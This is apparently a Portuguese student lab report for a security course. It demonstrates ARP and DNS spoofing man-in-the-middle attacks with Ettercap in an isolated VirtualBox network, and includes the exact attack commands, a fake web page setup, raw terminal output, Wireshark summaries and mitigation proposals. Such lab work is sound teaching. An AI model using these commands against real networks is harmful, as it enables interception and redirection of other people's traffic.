># Prova 03 — Implementação de um Ataque Man-in-the-Middle em Ambiente Virtualizado

> **Disciplina:** Segurança da Informação — 2º Semestre 2026  
> **Instituição:** IFTM Campus Patrocínio  
> **Professor:** junio-moreira-dev  
> **Objetivo:** Demonstrar, em ambiente isolado (Host-Only), a execução e análise de ataques Man-in-the-Middle (MITM) explorando vulnerabilidades nos protocolos ARP e DNS.

---

## Sumário

1. [Topologia da Rede](#1-topologia-da-rede)
2. [Cenário 1 — ARP Spoofing](#2-cenário-1--arp-spoofing)
3. [Cenário 2 — DNS Spoofing](#3-cenário-2--dns-spoofing)
4. [Capturas do Wireshark](#4-capturas-do-wireshark)
5. [Propostas de Mitigação](#5-propostas-de-mitigação)
6. [Link de Submissão](#6-link-de-submissão)

---

## 1. Topologia da Rede

Todas as máquinas virtuais foram configuradas com adaptador de rede **Host-Only** (`vboxnet0`), formando uma rede completamente isolada do ambiente externo.

| Máquina | Sistema Operacional | IP | MAC |
|---|---|---|---|
| Kali Linux (atacante) | Kali Linux 2026.2 | 192.168.56.102 | 08:00:27:5a:87:bc |
| Windows 11 (vítima) | Windows 11 64-bit | 192.168.56.103 | 08:00:27:1d:33:d9 |
| Metasploitable2 (alvo secundário) | Ubuntu (64-bit) | 192.168.56.100 | 08:00:27:57:3b:c4 |

```
┌─────────────────────────────────────────────────┐
│           Rede Host-Only: 192.168.56.0/24        │
│                                                   │
│   ┌──────────────┐       ┌──────────────────┐    │
│   │  Windows 11  │       │  Metasploitable2 │    │
│   │ .103 (vítima)│       │   .100 (alvo)    │    │
│   └──────┬───────┘       └────────┬─────────┘    │
│          │   tráfego interceptado  │              │
│          └──────────┬─────────────┘              │
│                     │                             │
│            ┌────────▼────────┐                   │
│            │   Kali Linux    │                   │
│            │ .102 (atacante) │                   │
│            └─────────────────┘                   │
└─────────────────────────────────────────────────┘
```

**Hypervisor:** Oracle VirtualBox  
**Tipo de rede:** Host-Only Adapter — sem roteamento externo, ambiente 100% isolado

---

## 2. Cenário 1 — ARP Spoofing

### 2.1 Conceito

O protocolo ARP (Address Resolution Protocol) resolve endereços IP em endereços MAC na camada 2. Por não possuir mecanismo de autenticação, qualquer host pode enviar respostas ARP falsas (gratuitous ARP), envenenando o cache ARP das vítimas e desviando o tráfego para o atacante.

### 2.2 Pré-requisito — Encaminhamento de Pacotes

Para que a vítima não perceba a interrupção da comunicação, o Kali deve repassar os pacotes capturados:

```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

Verificação:

```bash
cat /proc/sys/net/ipv4/ip_forward
# Saída esperada: 1
```

### 2.3 Execução do Ataque

```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.56.103// /192.168.56.100//
```

| Parâmetro | Descrição |
|---|---|
| `-T` | Interface de texto |
| `-q` | Modo silencioso (quiet) |
| `-i eth0` | Interface de rede alvo |
| `-M arp:remote` | Modo MITM via ARP com encaminhamento |
| `/192.168.56.103//` | Vítima (Windows 11) |
| `/192.168.56.100//` | Alvo secundário (Metasploitable2) |

**Saída relevante do Ettercap:**

```
ARP poisoning victims:
 GROUP 1 : 192.168.56.103 08:00:27:1D:33:D9
 GROUP 2 : 192.168.56.100 08:00:27:57:3B:C4
Starting Unified sniffing...
DHCP: [08:00:27:1D:33:D9] REQUEST 192.168.56.103
DHCP: [192.168.56.100] ACK : 192.168.56.103 255.255.255.0 GW invalid
```

### 2.4 Comprovação — Tabela ARP da Vítima

**Antes do ataque** — MAC real da Metasploitable2 associado ao IP `.100`:

```
192.168.56.100    08-00-27-57-3b-c4    dinâmico
192.168.56.102    08-00-27-5a-87-bc    dinâmico
```

**Depois do ataque** — MAC do Kali substituindo o da Metasploitable2:

```
192.168.56.100    08-00-27-5a-87-bc    dinâmico   ← MAC do Kali!
192.168.56.102    08-00-27-5a-87-bc    dinâmico
```

> O endereço MAC `08-00-27-5a-87-bc` pertence ao Kali Linux. A vítima (Windows 11) passou a associar o IP da Metasploitable2 ao MAC do atacante, desviando todo o tráfego destinado a `.100` para o Kali — caracterizando o ataque MITM.

📸 <img width="1091" height="825" alt="1" src="https://github.com/user-attachments/assets/4b509966-afea-4670-bafa-07335be973f8" />
📸 <img width="1024" height="768" alt="VirtualBox_Windows11_21_10_2026_13_42_14" src="https://github.com/user-attachments/assets/e8166e4b-5efc-49ef-bac3-7efbfa79eb07" />
📸 *[terminal do Ettercap com as vítimas]*
┌──(kali㉿kali)-[~]
└─$ ping 192.168.56.103
PING 192.168.56.103 (192.168.56.103) 56(84) bytes of data.
^C
--- 192.168.56.103 ping statistics ---
23 packets transmitted, 0 received, 100% packet loss, time 24715ms

                                                                             
┌──(kali㉿kali)-[~]
└─$ ping 192.168.56.103
PING 192.168.56.103 (192.168.56.103) 56(84) bytes of data.
64 bytes from 192.168.56.103: icmp_seq=1 ttl=128 time=1.06 ms
64 bytes from 192.168.56.103: icmp_seq=2 ttl=128 time=2.32 ms
64 bytes from 192.168.56.103: icmp_seq=3 ttl=128 time=0.788 ms
64 bytes from 192.168.56.103: icmp_seq=4 ttl=128 time=0.747 ms
64 bytes from 192.168.56.103: icmp_seq=5 ttl=128 time=0.712 ms
64 bytes from 192.168.56.103: icmp_seq=6 ttl=128 time=0.752 ms
64 bytes from 192.168.56.103: icmp_seq=7 ttl=128 time=0.756 ms
64 bytes from 192.168.56.103: icmp_seq=8 ttl=128 time=1.04 ms
64 bytes from 192.168.56.103: icmp_seq=9 ttl=128 time=1.03 ms
64 bytes from 192.168.56.103: icmp_seq=10 ttl=128 time=0.697 ms
^C
--- 192.168.56.103 ping statistics ---
10 packets transmitted, 10 received, 0% packet loss, time 9837ms
rtt min/avg/max/mdev = 0.697/0.988/2.317/0.462 ms
                                                                             
┌──(kali㉿kali)-[~]
└─$ ^V^H
: command not found
                                                                             
┌──(kali㉿kali)-[~]
└─$ 
                                                                             
┌──(kali㉿kali)-[~]
└─$ sudo sysctl -w net.ipv4.ip_forward=1
[sudo] password for kali: 
net.ipv4.ip_forward = 1
                                                                             
┌──(kali㉿kali)-[~]
└─$ cat /proc/sys/net/ipv4/ip_forward
1
                                                                             
┌──(kali㉿kali)-[~]
└─$ sudo ettercap -T -q -i eth0 -M arp:remote /192.168.56.103// /192.168.56.1//

ettercap 0.8.4.1 copyright 2001-2026 Ettercap Development Team

Listening on:
  eth0 -> 08:00:27:5A:87:BC
          192.168.56.102/255.255.255.0
          fe80::d0ac:8847:70e3:a73/64

This product includes GeoLite2 Data created by MaxMind, available from https://www.maxmind.com/.
SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
Privileges dropped to EUID 65534 EGID 65534...

  34 plugins
  42 protocol dissectors
  56 ports monitored
38702 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Lua: no scripts were specified, not starting up!

Scanning for merged targets (2 hosts)...

* |==================================================>| 100.00 %

2 hosts added to the hosts list...

ARP poisoning victims:

 GROUP 1 : 192.168.56.103 08:00:27:1D:33:D9

 GROUP 2 : 192.168.56.1 0A:00:27:00:00:0C
Starting Unified sniffing...


Text only Interface activated...
Hit 'h' for inline help


 Received packets    :       37
 Dropped packets     :        0  0.00 %
 Forwarded           :        1  bytes:       28

 Current queue len   : 0/1
 Sampling rate       : 50

 Bottom Half received packet : pck:       33  byte:     1918
 Top Half received packet    : pck:        3  byte:       54
 Interesting packets         : 9.09 %

 Bottom Half packet rate : worst:        0  adv:        0 p/s
 Top Half packet rate    : worst:        0  adv:        0 p/s

 Bottom Half throughput  : worst:        0  adv:        0 b/s
 Top Half throughput     : worst:        0  adv:        0 b/s



 [PROFILES] Inline help:

   [lL]  - detail on local hosts
   [rR]  - detail on remote hosts
   [sS]  - select a specific host
   [p]   - purge local hosts
   [P]   - purge remote hosts
   [qQ]  - return to main interface

No collected profiles !!
LOCAL hosts purged !
Returning to main menu...

Packet visualization restarted...

Packet visualization stopped...

Inline help:

 [vV]      - change the visualization mode
 [pP]      - activate a plugin
 [fF]      - (de)activate a filter
 [lL]      - print the hosts list
 [oO]      - print the profiles list
 [cC]      - print the connections list
 [rR]      - adjust SSL intercept rules
 [sS]      - print interfaces statistics
 [<space>] - stop/cont printing packets
 [qQ]      - quit


Packet visualization restarted...

Packet visualization stopped...
SSL Intercepts
 # IP Version                 Server IP Service
'd <number>' to delete or 'i' to insert new redirect (0 to quit): Invalid input
'd <number>' to delete or 'i' to insert new redirect (0 to quit): Invalid input
'd <number>' to delete or 'i' to insert new redirect (0 to quit): Invalid input
'd <number>' to delete or 'i' to insert new redirect (0 to quit): Invalid input
'd <number>' to delete or 'i' to insert new redirect (0 to quit): Invalid input
'd <number>' to delete or 'i' to insert new redirect (0 to quit): Invalid input
'd <number>' to delete or 'i' to insert new redirect (0 to quit): 
Invalid input
'd <number>' to delete or 'i' to insert new redirect (0 to quit): 0



User requested a CTRL+C... (deprecated, next time use proper shutdown)

^C^C^C^C
^C^C^C^C
                                                                             
┌──(kali㉿kali)-[~]
└─$ sudo ettercap -T -q -i eth0 -M arp:remote /192.168.56.103// /192.168.56.100//

ettercap 0.8.4.1 copyright 2001-2026 Ettercap Development Team

Listening on:
  eth0 -> 08:00:27:5A:87:BC
          192.168.56.102/255.255.255.0
          fe80::d0ac:8847:70e3:a73/64

This product includes GeoLite2 Data created by MaxMind, available from https://www.maxmind.com/.
SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
Privileges dropped to EUID 65534 EGID 65534...

  34 plugins
  42 protocol dissectors
  56 ports monitored
38702 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Lua: no scripts were specified, not starting up!

Scanning for merged targets (2 hosts)...

* |==================================================>| 100.00 %

2 hosts added to the hosts list...

ARP poisoning victims:

 GROUP 1 : 192.168.56.103 08:00:27:1D:33:D9

 GROUP 2 : 192.168.56.100 08:00:27:57:3B:C4
Starting Unified sniffing...


Text only Interface activated...
Hit 'h' for inline help

DHCP: [08:00:27:1D:33:D9] REQUEST 192.168.56.103
DHCP: [192.168.56.100] ACK : 192.168.56.103 255.255.255.0 GW invalid 

---

## 3. Cenário 2 — DNS Spoofing

### 3.1 Conceito

O protocolo DNS (Domain Name System) traduz nomes de domínio em endereços IP. Por também não possuir autenticação nas respostas, um atacante posicionado como MITM (via ARP spoofing) pode interceptar consultas DNS e devolver respostas falsificadas, redirecionando a vítima para um servidor sob seu controle.

### 3.2 Configuração do arquivo `etter.dns`

Adicionado ao final de `/etc/ettercap/etter.dns`:

```
exemplo-alvo.com      A   192.168.56.102
*.exemplo-alvo.com     A   192.168.56.102
```

Verificação:

```bash
tail -5 /etc/ettercap/etter.dns
```

### 3.3 Servidor Web Falso no Kali

```bash
mkdir -p /tmp/fakepage && cd /tmp/fakepage
echo "<h1>Site falsificado - PoC DNS Spoofing</h1>" > index.html
sudo python3 -m http.server 80
```

### 3.4 Execução do Ataque

```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.56.103// /192.168.56.100// -P dns_spoof
```

O parâmetro `-P dns_spoof` ativa o plugin de DNS spoofing do Ettercap, que intercepta consultas DNS que passam pelo Kali (por conta do ARP spoof ativo) e retorna respostas falsificadas conforme definido no `etter.dns`.

### 3.5 Configuração do DNS na Vítima

Para forçar as consultas DNS pelo canal MITM (IPv4):

```cmd
netsh interface ip set dns "Ethernet" static 192.168.56.100 validate=no
ipconfig /flushdns
```

### 3.6 Comprovação

**Via `nslookup`** (Windows 11):

```
C:\Users\vboxuser> nslookup exemplo-alvo.com 192.168.56.100
Nome:    exemplo-alvo.com
Address: 192.168.56.102       ← IP do Kali, não o real!
```

**Via navegador** — ao acessar `http://exemplo-alvo.com`, o Edge carregou a página falsa hospedada no Kali em vez do site legítimo.

📸 <img width="1024" height="768" alt="nslookup" src="https://github.com/user-attachments/assets/41d35ed1-3660-46d7-8108-7571073cd395" />  
📸 <img width="1024" height="768" alt="site falso" src="https://github.com/user-attachments/assets/32c18a8a-db90-4702-90bb-41f8f398c8d3" />

---


## 4. Capturas do Wireshark

As capturas foram realizadas na interface `eth0` do Kali durante os ataques.

### 4.1 ARP Poisoning (arp.pcapng / eth0.pcapng)

Pacotes que evidenciam o envenenamento ARP em andamento:

```
Kali (5a:87:bc) → Windows  (1d:33:d9): "192.168.56.100 is at 08:00:27:5a:87:bc"
Kali (5a:87:bc) → Metaspl. (21:72:c0): "192.168.56.103 is at 08:00:27:5a:87:bc"
```

O Kali anuncia para ambas as vítimas que o MAC dos demais hosts é o seu próprio, forçando o tráfego a passar por ele.

### 4.2 Tráfego DNS Interceptado (dns.pcapng)

```
192.168.56.103 → 192.168.56.100  DNS  Standard query A www.bing.com
192.168.56.103 → 192.168.56.100  DNS  Standard query A functional.events.data.microsoft.com
```

Consultas DNS originadas pelo Windows (`.103`) e destinadas à Metasploitable (`.100`), passando pelo Kali por conta do ARP spoof ativo — comprovando a posição de MITM.

📸 <img width="1280" height="800" alt="arpdetalhado" src="https://github.com/user-attachments/assets/8ad28235-7e1a-4634-bc26-9139e16378f0" />
📸 <img width="1280" height="800" alt="dns2" src="https://github.com/user-attachments/assets/abc5bbb9-5669-4aed-9277-260d0d5c8c30" />

Os arquivos `.pcapng` estão disponíveis neste repositório:
- `arp.pcapng` — captura focada nos pacotes ARP
- `dns.pcapng` — captura focada no tráfego DNS interceptado
- `eth0.pcapng` — captura geral da interface eth0 durante os ataques

---

## 5. Propostas de Mitigação

### 5.1 Contra ARP Spoofing

| Medida | Descrição |
|---|---|
| **Dynamic ARP Inspection (DAI)** | Switches gerenciados validam pacotes ARP contra a tabela de DHCP Snooping, descartando respostas não autorizadas |
| **DHCP Snooping** | Controla quais portas do switch podem responder a requisições DHCP, mapeando IPs a MACs legítimos |
| **Entradas ARP estáticas** | Para hosts críticos, configurar manualmente a associação IP↔MAC impede substituição por ARP dinâmico |
| **Ferramentas de monitoramento** | `arpwatch` e XArp detectam mudanças suspeitas no cache ARP e alertam administradores |
| **Segmentação de rede** | VLANs reduzem o domínio de broadcast, limitando o alcance de ataques ARP a segmentos menores |

### 5.2 Contra DNS Spoofing

| Medida | Descrição |
|---|---|
| **DNSSEC** | Adiciona assinaturas criptográficas às respostas DNS, permitindo que clientes validem a autenticidade das respostas |
| **DoH / DoT** | DNS over HTTPS ou DNS over TLS cifra as consultas, impedindo a interceptação em texto claro |
| **HTTPS com HSTS** | Mesmo com DNS falsificado, um certificado TLS inválido gera alerta ao usuário; HSTS impede downgrade para HTTP |
| **Fixar servidores DNS confiáveis** | Usar resolvers com suporte a DNSSEC (ex.: 1.1.1.1 da Cloudflare, 8.8.8.8 do Google) |
| **Monitoramento de respostas DNS** | Soluções como Pi-hole ou DNS corporativo com logging detectam respostas anômalas |

### 5.3 Considerações Gerais

O ataque MITM demonstrado foi possível porque os protocolos ARP e DNS foram projetados em uma época em que redes internas eram consideradas confiáveis por definição. A defesa mais robusta é a **defesa em profundidade**: combinação de criptografia (TLS, DNSSEC), controles de infraestrutura (DAI, DHCP Snooping) e monitoramento contínuo, de forma que a falha de uma camada não comprometa o sistema inteiro.

---

## 6. Link de Submissão

> 🔗 [Inserir aqui o link de submissão do Moodle]

---

*Atividade realizada em ambiente virtualizado isolado (Host-Only), exclusivamente para fins educacionais, conforme orientações da disciplina.*
